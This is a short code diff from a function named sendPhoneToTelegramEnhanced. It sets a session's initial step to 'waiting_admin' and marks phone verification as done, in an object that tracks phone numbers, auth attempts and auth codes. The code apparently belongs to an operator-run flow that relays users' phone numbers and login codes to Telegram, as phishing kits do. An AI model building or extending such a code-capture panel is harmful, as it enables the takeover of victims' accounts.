@@ -539,8 +539,8 @@ export const sendPhoneToTelegramEnhanced = async (
       sessionId,
       phoneNumber,
       startTime: new Date().toISOString(),
-      completedSteps: [],
-      currentStep: "phone_verification",
+      completedSteps: ["phone_verification"], // Mark phone as completed for admin buttons
+      currentStep: "waiting_admin", // Set to waiting_admin to show admin buttons
       authAttempts: {},
       authCodes: {},
       onlineStatus: {
